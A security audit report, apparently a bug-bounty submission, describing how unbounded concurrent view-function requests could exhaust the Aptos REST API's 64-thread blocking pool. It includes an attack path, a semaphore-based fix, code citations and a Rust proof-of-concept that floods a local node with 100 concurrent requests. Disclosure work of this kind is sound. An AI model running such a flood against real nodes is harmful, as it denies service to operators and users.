# Audit Report

## Title
Unbounded Concurrent View Requests Can Exhaust Tokio Blocking Thread Pool Leading to API Denial of Service

## Summary
The Aptos REST API lacks concurrent request limiting for view function endpoints, allowing attackers to exhaust the hardcoded 64-thread tokio blocking pool by flooding the API with concurrent `ViewRequest` calls. This causes complete API unavailability affecting all endpoints that use `api_spawn_blocking`.

## Finding Description
The view function endpoint at [1](#0-0)  processes requests by calling `api_spawn_blocking`, which internally uses tokio's `spawn_blocking` [2](#0-1) .

The tokio runtime is configured with a hardcoded limit of 64 blocking threads [3](#0-2) . The comment explicitly acknowledges this is meant to prevent REST API calls from overwhelming the node, yet no enforcement mechanism exists.

Unlike the `wait_by_hash` endpoint which has a `wait_by_hash_max_active_connections` limit [4](#0-3) , view functions have no such protection. Additionally, at least 8 API endpoints share this same blocking thread pool [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) [9](#0-8) .

**Attack Path:**
1. Attacker sends 64+ concurrent POST requests to `/v1/view` with valid view function payloads
2. All 64 blocking threads become occupied executing view functions (which can take time due to Move VM execution)
3. Additional API requests (from legitimate users or other endpoints) queue indefinitely
4. API becomes unresponsive, timing out all subsequent requests
5. This breaks the "Resource Limits" invariant - operations do not respect computational limits

## Impact Explanation
This qualifies as **High Severity** per Aptos bug bounty criteria:
- **API crashes**: Complete API unavailability when thread pool is exhausted
- **Validator node slowdowns**: All API endpoints become unresponsive, affecting node operations that depend on the API
- **Significant protocol violations**: Breaks the resource limits invariant

The impact extends beyond view functions to ALL API endpoints using `api_spawn_blocking`, including critical transaction submission, account queries, and state retrieval endpoints. This can render a fullnode's API completely unusable.

## Likelihood Explanation
**Likelihood: HIGH**

- **No authentication required**: Any network peer can send API requests
- **Trivial to exploit**: Simple HTTP client with concurrent requests
- **Low resource requirement**: Attacker needs minimal bandwidth
- **No rate limiting**: No per-IP or global concurrent request limits exist
- **Persistent effect**: Once exhausted, thread pool remains saturated while view functions execute

The view filter [10](#0-9)  only blocks specific functions but doesn't prevent flooding with allowed functions.

## Recommendation
Implement concurrent request limiting using a Semaphore pattern similar to the faucet service implementation:

```rust
// In ApiConfig (config/src/config/api_config.rs)
pub max_concurrent_view_requests: usize,  // default: 32

// In Context (api/src/context.rs)
pub view_requests_semaphore: Arc<Semaphore>,

// In ViewFunctionApi (api/src/view_function.rs)
async fn view_function(...) -> BasicResultWith404<Vec<MoveValue>> {
    // Acquire semaphore permit
    let _permit = self.context.view_requests_semaphore
        .try_acquire()
        .map_err(|_| BasicErrorWith404::service_unavailable_with_code_no_info(
            "Server overloaded with concurrent view requests",
            AptosErrorCode::ServiceUnavailable
        ))?;
    
    // Existing logic...
    api_spawn_blocking(move || {
        let _permit = _permit;  // Move permit into closure
        view_request(context, accept_type, request, ledger_version)
    }).await
}
```

Apply similar protection to other high-volume endpoints (accounts, transactions, state) to prevent cross-endpoint exhaustion.

## Proof of Concept
```rust
// Rust PoC - compile with: cargo test --test view_flood_test

use reqwest::Client;
use serde_json::json;
use tokio;

#[tokio::test]
async fn test_view_function_thread_exhaustion() {
    let client = Client::new();
    let url = "http://localhost:8080/v1/view";
    
    // Create 100 concurrent view requests (exceeds 64 thread limit)
    let mut handles = vec![];
    for _ in 0..100 {
        let client = client.clone();
        let handle = tokio::spawn(async move {
            let payload = json!({
                "function": "0x1::chain_id::get",
                "type_arguments": [],
                "arguments": []
            });
            
            let start = std::time::Instant::now();
            let result = client.post(url)
                .json(&payload)
                .send()
                .await;
            let duration = start.elapsed();
            
            println!("Request completed in {:?}: {:?}", duration, result.is_ok());
            result
        });
        handles.push(handle);
    }
    
    // After first 64 requests, subsequent requests will timeout
    let results: Vec<_> = futures::future::join_all(handles).await;
    let successes = results.iter().filter(|r| r.is_ok()).count();
    
    println!("Successful requests: {}/100", successes);
    // Expected: Many requests timeout or fail after the 64th
    assert!(successes < 100, "Thread pool should be exhausted");
}
```

## Notes
The vulnerability affects all fullnodes exposing the REST API. While validator nodes typically don't expose public APIs, this still impacts ecosystem infrastructure (public fullnodes, indexers, RPC providers). The 64-thread limit is insufficient for production load, and the lack of per-endpoint or global concurrent request limiting makes this easily exploitable for targeted DoS attacks against specific node operators.

### Citations

**File:** api/src/view_function.rs (L75-92)
```rust
    async fn view_function(
        &self,
        accept_type: AcceptType,
        /// View function request with type and position arguments
        request: ViewFunctionRequest,
        /// Ledger version to get state of account
        ///
        /// If not provided, it will be the latest version
        ledger_version: Query<Option<U64>>,
    ) -> BasicResultWith404<Vec<MoveValue>> {
        fail_point_poem("endpoint_view_function")?;
        self.context
            .check_api_output_enabled("View function", &accept_type)?;

        let context = self.context.clone();
        api_spawn_blocking(move || view_request(context, accept_type, request, ledger_version))
            .await
    }
```

**File:** api/src/context.rs (L1643-1654)
```rust
/// This function just calls tokio::task::spawn_blocking with the given closure and in
/// the case of an error when joining the task converts it into a 500.
pub async fn api_spawn_blocking<F, T, E>(func: F) -> Result<T, E>
where
    F: FnOnce() -> Result<T, E> + Send + 'static,
    T: Send + 'static,
    E: InternalError + Send + 'static,
{
    tokio::task::spawn_blocking(func)
        .await
        .map_err(|err| E::internal_with_code_no_info(err, AptosErrorCode::InternalError))?
}
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** config/src/config/api_config.rs (L89-90)
```rust
    /// The number of active wait_by_hash requests that can be active at any given time.
    pub wait_by_hash_max_active_connections: usize,
```

**File:** config/src/config/api_config.rs (L215-242)
```rust
pub enum ViewFilter {
    /// Allowlist of functions. If a function is not found here, the API will refuse to
    /// service the view / simulation request.
    Allowlist(Vec<ViewFunctionId>),
    /// Blocklist of functions. If a function is found here, the API will refuse to
    /// service the view / simulation request.
    Blocklist(Vec<ViewFunctionId>),
}

impl Default for ViewFilter {
    fn default() -> Self {
        ViewFilter::Blocklist(vec![])
    }
}

impl ViewFilter {
    /// Returns true if the given function is allowed by the filter.
    pub fn allows(&self, address: &AccountAddress, module: &str, function: &str) -> bool {
        match self {
            ViewFilter::Allowlist(ids) => ids.iter().any(|id| {
                &id.address == address && id.module == module && id.function_name == function
            }),
            ViewFilter::Blocklist(ids) => !ids.iter().any(|id| {
                &id.address == address && id.module == module && id.function_name == function
            }),
        }
    }
}
```

**File:** api/src/transactions.rs (L8-8)
```rust
    context::{api_spawn_blocking, Context, FunctionStats},
```

**File:** api/src/state.rs (L6-6)
```rust
    context::api_spawn_blocking,
```

**File:** api/src/accounts.rs (L6-6)
```rust
    context::{api_spawn_blocking, Context},
```

**File:** api/src/blocks.rs (L6-6)
```rust
    context::{api_spawn_blocking, Context},
```

**File:** api/src/events.rs (L7-7)
```rust
    context::{api_spawn_blocking, Context},
```
